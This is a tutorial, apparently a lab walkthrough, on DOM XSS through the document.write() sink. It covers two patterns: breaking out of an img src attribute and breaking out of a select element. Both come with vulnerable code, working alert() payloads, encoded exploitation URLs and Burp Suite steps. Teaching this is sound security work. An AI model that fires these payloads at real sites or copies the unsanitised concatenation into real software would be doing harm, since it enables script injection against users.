# DOM XSS — `document.write()` Sink

## When this applies

The application calls `document.write()` (or `document.writeln()`) with attacker-controllable data, typically from `location.search`, `location.hash`, or `document.referrer`. `document.write()` is the most permissive sink — it parses arbitrary HTML including `<script>` tags during page load.

## Technique

`document.write()` injects raw HTML into the document. The attacker breaks out of the surrounding context (attribute, tag, or restrictive parent like `<select>`) and injects executable HTML.

**Vulnerability:**
```javascript
document.write('<img src="/tracker.gif?q=' + userInput + '">');
```

**Exploitation:**
- Can inject full HTML/script tags
- Executes immediately during page parsing
- Most permissive sink

**Payload:**
```html
"><script>alert(1)</script>
"><svg onload=alert(1)>
```

## Steps

### Pattern 1 — Attribute Context Inside Tracker Image

#### Vulnerable Code
```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

#### Vulnerability Analysis
- **Source:** `location.search` (search parameter)
- **Sink:** `document.write()`
- **Context:** Inside img src attribute
- **No sanitization:** Direct concatenation

#### Step-by-Step Solution

1. Navigate to the page.
2. Use the search box to submit a test query.
3. Observe the URL: `/?search=test`.
4. Inject the payload: `/?search="><svg onload=alert(1)>`.
5. The alert fires.

#### Working Payloads

```html
"><svg onload=alert(1)>
"><script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
```

#### Complete Exploitation URL
```
https://target.com/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E
```

#### Burp Suite Workflow

**Using DOM Invader:**
1. Open Burp's built-in browser
2. Enable DOM Invader (F12 > DOM Invader tab)
3. Navigate to the page
4. DOM Invader auto-injects canary into search parameter
5. Check "Sinks" panel - shows `document.write` sink
6. Click the sink to see context and stack trace
7. Craft payload based on context: `"><svg onload=alert(1)>`

**Using Proxy:**
1. Intercept search request
2. Modify search parameter to include payload
3. Forward request
4. Observe XSS execution

**Using Repeater:**
1. Send GET request to Repeater
2. Modify: `GET /?search="><svg onload=alert(1)> HTTP/1.1`
3. Send and view response HTML

#### Common Mistakes
- Forgetting to close the attribute with `"`
- Not closing the img tag with `>`
- Using only `<script>alert(1)</script>` without breaking out
- Not URL-encoding when testing via browser

### Pattern 2 — Inside `<select>` Element (Restrictive Parent)

#### Vulnerable Code
```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) continue;
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

#### Vulnerability Analysis
- **Source:** `location.search` (storeId parameter)
- **Sink:** `document.write()`
- **Context:** Inside `<select>` element, within `<option>` tag
- **Challenge:** Must break out of select context

#### Step-by-Step Solution

1. Navigate to any product page: `/product?productId=1`.
2. Observe stock checker with store dropdown.
3. Test: `/product?productId=1&storeId=TEST`.
4. Inspect HTML: `<option selected>TEST</option>`.
5. Inject: `/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>`.
6. Alert fires.

#### Working Payloads

```html
"></select><img src=1 onerror=alert(1)>
"></select><script>alert(1)</script>
"></select><svg onload=alert(1)>
"></select><iframe src="javascript:alert(1)">
```

#### Payload Breakdown: `"></select><img src=1 onerror=alert(1)>`

1. **`">`** - Closes the option tag
2. **`</select>`** - Closes the select element (escapes restrictive context)
3. **`<img src=1 onerror=alert(1)>`** - Injects executable code

#### Before and After

**Before injection:**
```html
<select name="storeId">
    <option selected>USER_INPUT</option>
    <option>London</option>
</select>
```

**After injection:**
```html
<select name="storeId">
    <option selected>"></select><img src=1 onerror=alert(1)></option>
</select>
```

**What browser sees:**
```html
<select name="storeId">
    <option selected>">
</select>
<img src=1 onerror=alert(1)>
<!-- Rest is parsed differently -->
```

#### Why Breaking Out is Necessary

**Select element restrictions:**
- Only `<option>` and `<optgroup>` are valid children
- Event handlers on options are unreliable
- Can't inject scripts without escaping

**Must close </select> to:**
- Exit restrictive context
- Return to normal HTML parsing
- Allow arbitrary HTML injection

#### Complete URL
```
https://target.com/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

#### Common Mistakes
- Forgetting to close select: `"><img src=x onerror=alert(1)>` ❌
- Not closing the attribute: `</select><img src=x onerror=alert(1)>` ❌
- Wrong parameter name: Using `store` instead of `storeId` ❌
- Testing on wrong page: Must be on product page ❌

#### Burp Suite Workflow

**Using DOM Invader:**
1. Navigate to product page
2. DOM Invader may auto-inject into storeId
3. Check sinks panel for document.write
4. Verify context shows select/option structure
5. Craft breakout payload

**Using Repeater:**
1. Send product page request to Repeater
2. Add storeId parameter with payload
3. Send and analyze response HTML
4. Verify injection point and context

## Verifying success

- Page renders attacker payload (alert fires, image with `onerror` triggers).
- DevTools Elements view shows the injected tag in the actual DOM.
- Removing the payload from URL restores normal page content.

## Common pitfalls

1. **Forgetting attribute breakout** — leaving the `"` open keeps your payload inside the attribute.
2. **Not closing restrictive parent** — `<select>`, `<textarea>`, `<style>` only render certain children; must close them to inject arbitrary HTML.
3. **URL encoding inconsistencies** — the browser auto-encodes some characters; manually `%`-encode `<`, `>`, `"` to be safe.
4. **`document.write()` after page load is destructive** — overwrites the entire document. If the call is inside `DOMContentLoaded` it may behave differently.

## Tools

- **DOM Invader** — auto-detect sink and context
- **Burp Repeater + Render** — preview the injected HTML
- **DevTools Elements panel** — confirm DOM after injection
